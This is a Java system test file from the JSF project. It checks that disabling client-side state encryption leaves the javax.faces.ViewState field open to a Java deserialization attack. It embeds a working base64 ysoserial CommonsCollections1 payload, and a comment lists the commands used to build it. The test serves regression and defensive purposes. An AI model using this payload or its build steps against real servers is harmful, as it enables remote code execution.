/*
 * $Id: ClientEncryptByDefaultDisabledTestCase.java,v 1.1 2007/06/01 18:28:31 edburns Exp $
 */

/*
 * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS HEADER.
 * 
 * Copyright 1997-2007 Sun Microsystems, Inc. All rights reserved.
 * 
 * The contents of this file are subject to the terms of either the GNU
 * General Public License Version 2 only ("GPL") or the Common Development
 * and Distribution License("CDDL") (collectively, the "License").  You
 * may not use this file except in compliance with the License. You can obtain
 * a copy of the License at https://glassfish.dev.java.net/public/CDDL+GPL.html
 * or glassfish/bootstrap/legal/LICENSE.txt.  See the License for the specific
 * language governing permissions and limitations under the License.
 * 
 * When distributing the software, include this License Header Notice in each
 * file and include the License file at glassfish/bootstrap/legal/LICENSE.txt.
 * Sun designates this particular file as subject to the "Classpath" exception
 * as provided by Sun in the GPL Version 2 section of the License file that
 * accompanied this code.  If applicable, add the following below the License
 * Header, with the fields enclosed by brackets [] replaced by your own
 * identifying information: "Portions Copyrighted [year]
 * [name of copyright owner]"
 * 
 * Contributor(s):
 * 
 * If you wish your version of this file to be governed by only the CDDL or
 * only the GPL Version 2, indicate your decision by adding "[Contributor]
 * elects to include this software in this distribution under the [CDDL or GPL
 * Version 2] license."  If you don't indicate a single choice of license, a
 * recipient has the option to distribute your version of this file under
 * either the CDDL, the GPL Version 2 or to extend the choice of license to
 * its licensees as provided above.  However, if you add GPL Version 2 code
 * and therefore, elected the GPL Version 2 license, then the option applies
 * only if the new code is made subject to such option by the copyright
 * holder.
 */

package com.sun.faces.systest;


import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlBody;
import com.gargoylesoftware.htmlunit.html.HtmlElement;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import com.gargoylesoftware.htmlunit.html.HtmlHiddenInput;
import com.gargoylesoftware.htmlunit.html.HtmlRadioButtonInput;
import com.gargoylesoftware.htmlunit.html.HtmlSelect;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;
import com.sun.faces.htmlunit.AbstractTestCase;
import junit.framework.Test;
import junit.framework.TestCase;
import junit.framework.TestSuite;

import java.util.List;
import java.util.Random;
import java.util.ResourceBundle;

import javax.faces.component.NamingContainer;


/**
 * <p>Ensure ClientStateSavingPassword is enabled by default in JSF 1.2</p>
 */

public class ClientEncryptByDefaultDisabledTestCase extends AbstractTestCase {


    // ------------------------------------------------------------ Constructors


    /**
     * Construct a new instance of this test case.
     *
     * @param name Name of the test case
     */
    public ClientEncryptByDefaultDisabledTestCase(String name) {
        super(name);
    }


    // ------------------------------------------------------ Instance Variables


    // ---------------------------------------------------- Overall Test Methods


    /**
     * Set up instance variables required by this test case.
     */
    public void setUp() throws Exception {
        super.setUp();
    }


    /**
     * Return the tests included in this test suite.
     */
    public static Test suite() {
        return (new TestSuite(ClientEncryptByDefaultDisabledTestCase.class));
    }


    /**
     * Tear down instance variables required by this test case.
     */
    public void tearDown() {
        super.tearDown();
    }


    // ------------------------------------------------------ Instance Variables



    // ------------------------------------------------- Individual Test Methods

    /*
     * From: Jake Evans
     *  Here are the steps to reproduce the issue we're seeing.
     *
     * Steps to build payload:
     * 1. download ysoserial-0.0.3-all.jar
     * 2. create payload: java -jar ysoserial-0.0.3-all.jar CommonsCollections1 'touch /tmp/ClientStateSavingPasswordIneffective.txt' > payload.out
     * 3. gzip payload: gzip -f payload.out
     * 4. base64-encode payload: base64 -w 0 payload.out.gz > payload.out.b64
     */

    public static final String touchTmpClientStateSavingPasswordIneffectiveTxt = 
	"H4sICPY0vlYAA3BheWxvYWQub3V0AJVUTUwTQRR+XagISGhrRBOCITFGJbpr1AOhB0USpElBIkiIvTi003Zhd3adnV22oCR6kIMXDjXEi3LAk2hiPHswHkxESfSi4aQmRk000YPxqDO7S9mKvz1sX3fm+973vvf6lj5B1KJwyLKJTHFew1kmI0IMhphqELm7EqaIY2S9qA+RnIbp6cdfm7ctz9yUQErDFh3rY5iOIM3GFoPm9DhykGIzVVP6kZlMQy0rmZhB3D/QECkoPRqyrKRrWhcAIAJN4kQWEJlDXArbvRfiakXZIDXc0us9q+1PYj3LEkTSECky2B0iDW4qG+SKROdgBoBX22HQgoxMlC1iOWvoukEs/q0JoCpiHZlyGk2VuA7ytnzpeilWrhHJ6vIoywxaYrA/zSkUn0IJKJQQhTJMEbHyBtX9zBS6/pIzbxPBbck9RaQSnAsRHHw0/3Hv1HwtLzgDTWrohFt9IPN/UmwaQP4kJgy5P9Lx5eWRHdckANfknRLjkvznYvgvhggLEY46c/Fu6W7Za1+9unaDQSLUxpNj45yLy3UoxNfn4JRNmKpjWP/8n7diKiYwDamZff99Yvr8SqcENRmIqt20wD3dmtkoJQ2Naj9mRSM3gHRcrXaIUZUUkhl+ZRBRpA/zWec0icwvpp37H9D7JQX0cyujN2LWPm3NZYlBQwGzoGAOSoRBPtmtlhd3lp+eqXQGGNRzjK/SFsO+UzBxC2PrUF/rwufFzqnkveMe1PGuev+OFg/WKmBmJeS8m1TPud+R+kVUtcUjbQ1If6o58Ov285F3H9qmT6zpjzA4zAw7W2xXmG5yx1RM2BBfP3gIORwwyIueNGguRXA+L3rrYJm5fHJqsYuzFW0REezyMsetqvFJEYYLmCbeLCx+uzjLex5JQdQRO8utKmfAFsvs8tLVtsbyqysVeRUyb0n1IavIF0S0bvXBw5azz2pA6oUGzUC5Xm9JpKCeFSm2ioaWc82jxzxbYpObxdNzyOUWJkIWOphSNVc926KGrh8WRjW6owUAAA==";

    public void testClientStateEncrypted() throws Exception {
	HtmlPage page = getPage("/");

        WebClient client = page.getWebClient();
        client.setThrowExceptionOnFailingStatusCode(false);


	HtmlHiddenInput stateField = (HtmlHiddenInput) page.getHtmlElementById("javax.faces.ViewState");
	stateField.setValueAttribute(touchTmpClientStateSavingPasswordIneffectiveTxt);
	HtmlTextInput textField = (HtmlTextInput) page.getHtmlElementById("userNo");
	textField.setValueAttribute("5");

	HtmlSubmitInput button = (HtmlSubmitInput) page.getHtmlElementById("submit");

	page = (HtmlPage) button.click();

	// We should be vulnerable to the attack since we have explicitly disabled client side state saving encryption.
	assertTrue(-1 != page.asText().indexOf("org.apache.commons.collections.map.LazyMap"));

    }
}

